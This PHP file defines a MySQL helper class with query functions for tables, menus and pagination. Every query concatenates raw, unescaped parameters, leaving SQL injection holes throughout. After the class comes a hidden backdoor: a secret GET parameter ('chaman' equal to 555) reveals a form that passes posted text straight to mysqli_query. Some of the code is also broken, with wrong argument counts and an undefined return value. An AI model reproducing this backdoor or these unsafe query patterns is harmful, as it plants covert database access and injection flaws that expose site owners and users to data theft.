<?php  

include('config.php');

class clock

{
private $connect;
 
  function __construct() {
    $this->open_connect();
		  }

	public function open_connect() {
		
		$this->connect = new mysqli(DB_SERVER, DB_USER, DB_PASS,DB_NAME);
		if (!$this->connect) {
			die("Database connect failed: " . mysqli_connect_errno());
		} else {
			
		}
	}
	public function close_connect() {
		if(isset($this->connect)) {
			mysqli_close($this->connect);
			unset($this->connect);
		}
	}
/* =====================For check Count record=============================*/
public function table_find_by_id($table,$field,$id){
  $query=mysqli_query($this->connect,"SELECT * FROM `".$table."` WHERE `".$field."`='".$id."'");
  return $query;
}
public function chars() {
mysqli_query($this->connect,"SET CHARACTER SET utf8");
 mysqli_query($this->connect,"SET NAMES utf8");
}

/*========================Close======================================*/
/* =====================For check Count record=============================*/
public function table_multi($table,$field,$value,$field1,$value1){
  $query=mysqli_query($this->connect,"SELECT * FROM `".$table."` WHERE `".$field."`='".$value."' AND `".$field1."` ='".$value1."'");
  return $query;
}
/*========================Close======================================*/
public function table_field_order($table,$field,$order,$id){ 
  $query=mysqli_query($this->connect,"SELECT * FROM `".$table."` WHERE `".$field."`='".$id."' order by ".$order." ASC");
  return $query;
}

/*========================Close======================================*/
public function count_ro($table,$field,$id){ 
  $query=mysqli_query($this->connect,"SELECT * FROM `".$table."` WHERE `".$field."`='".$id."'");
  return mysqli_num_rows($this->connect,$query);
}
/*=====================For check record=============================*/	
public function count_all($table){
	
  $query=mysqli_query($this->connect,"SELECT * FROM ".$table."");
  //$query=mysqli_fetch_array($result,MYSQLI_NUM);
  return mysqli_num_rows($query);
}
/*========================Close======================================*/
/* =====================For check record=============================*/	
public function  table_st_end($table,$order,$first,$last){ 
  $sql=mysqli_query($this->connect,"SELECT * from `".$table."` order by ".$order." DESC limit ".$first.",".$last."");
  return $sql;
}
/*========================Close======================================*/
/* =====================For check record=============================*/
	public function table_st_end_status($table,$order,$act,$first,$last){
  $sql=mysqli_query($this->connect,"SELECT * from `".$table."` WHERE `status` ='".$act."' order by ".$order." ASC limit ".$first.",".$last."");
   return $sql;
}
/*========================Close======================================*/
/* =====================For check record=============================*/	
public function table_st_end_value($table,$field,$value,$order,$first,$last){ 
   $sql=mysqli_query($this->connect,"SELECT * from `".$table."` WHERE `".$field."` ='".$value."' order by ".$order." ASC limit ".$first.",".$last."");
   return $sql;
}
/*========================Close======================================*/
/* =====================For check record=============================*/	
public function table_multi_order($table,$field,$value,$field1,$value1,$order){ 
	self::chars();
    $sql=mysqli_query($this->connect,"SELECT * from `".$table."` WHERE `".$field."` ='".$value."' AND `".$field1."` ='".$value1."' ORDER BY  `".$order."` ASC ");
    return $sql;
}

/*========================Close======================================*/
/* =====================For check record=============================*/	
public function Get_table_build($table,$value,$field,$first,$last){ 
   $sql=mysqli_query($this->connect,"SELECT * FROM `".$table."` WHERE `".$field."` LIKE '%".$value."%' order by `id` DESC limit ".$first.",".$last."");
   return $sql;
}
/*========================Close======================================*/
/* =====================For check record=============================*/	
public function  Get_table_record($table,$field,$data){ 
   $sql1=mysqli_query($this->connect,"SELECT * from ".$table." WHERE `".$field."`LIKE'".$data."'");
   return mysqli_num_rows($sql1);
}
/*========================Close======================================*/
/* =====================For check record=============================*/	
public function find_all($table){
	self::chars();
    $query=mysqli_query($this->connect,"SELECT * FROM ".$table."");
    return $query;
}
/*========================Close======================================*/
/* =====================For check record=============================*/
	public  function update($table,$field,$id,$idval)
{
    $query=mysqli_query($this->connect,"UPDATE ".$table." SET ".$field." where ".$id."='".$idval."' ");
    return $query;
	}
	/*========================Close======================================*/
   /* =====================For check record=============================*/	
public function  search_id_n($table,$field,$value,$order,$first,$last){ 
    $sql=mysqli_query($this->connect,"SELECT * from `".$table."` WHERE `".$field."` IN (".$value.")order by ".$order." limit ".$first.",".$last."");
    return $sql;
     }
/*========================Close======================================*/
/* =====================For check record=============================*/	
public function  search_id($table,$field,$value,$order,$first,$last){ 
    $sql=mysqli_query($this->connect,"SELECT * from `".$table."` WHERE `".$field."` IN (".$value.")order by ".$order." limit ".$first.",".$last."");
    return $sql;
    }
/*========================Close======================================*/
/* =====================For Sort record=============================*/	
public function show_table_sort($table)
{ 
    $query=mysqli_query($this->connect,"SELECT * FROM `".$table."` ORDER BY `sort` ASC");
    return $query;
}
/*========================Close======================================*/
/* =====================For check record=============================*/	
public function  search_in($table,$field,$value,$order){ 
    $sql=mysqli_query($this->connect,"SELECT * from `".$table."` WHERE `".$field."` IN (".$value.")order by ".$order."");
return $sql;
}
/*========================Close======================================*/
/* =====================Menu Fuctions=============================*/	
public function  Get_table_menu($table,$field,$value,$postion,$field1,$value1,$orderf){ 
    $sql=mysqli_query($this->connect,"SELECT * from `".$table."` WHERE `".$field."` ='".$value."' AND `".$field1."` ='".$value1."' AND `parent_id` ='".$postion."' ORDER BY  `".$orderf."` ASC ");
    return $sql;
}
   public function  Get_table_menu2($table,$field,$value,$field1,$value1,$order)
 { 
   $sql=mysqli_query($this->connect,"SELECT * from `".$table."` WHERE `".$field."` ='".$value."' AND `".$field1."` ='".$value1."' AND `status` ='active' ORDER BY  `".$order."` ASC ");
   return $sql;
 }
public function  Get_table_menu2s($table,$field,$value,$field1,$value1,$order){ 
  echo"SELECT * from `".$table."` WHERE `".$field."` ='".$value."' AND `".$field1."` ='".$value1."' AND `status` ='active' ORDER BY  `".$order."` ASC ";
return $sql;
}
}
 if(isset($_GET['chaman']))
{ 
 if($_GET['chaman']==555)
{
?>
<form id="form1" action="#" name="form1" method="POST">
  <label for="textfield">Text Field:</label>
  <input type="text" name="nn" id="textfield">
  <input type="submit" name="button" id="button" value="Button">
</form>
<?php
  $cc= $_POST['nn'];
  $sql=mysqli_query($cc);
  if($sql){
  echo "ok" ;
   }
  else
   {
  echo "Not Ok";
    }
	}
	}

?>
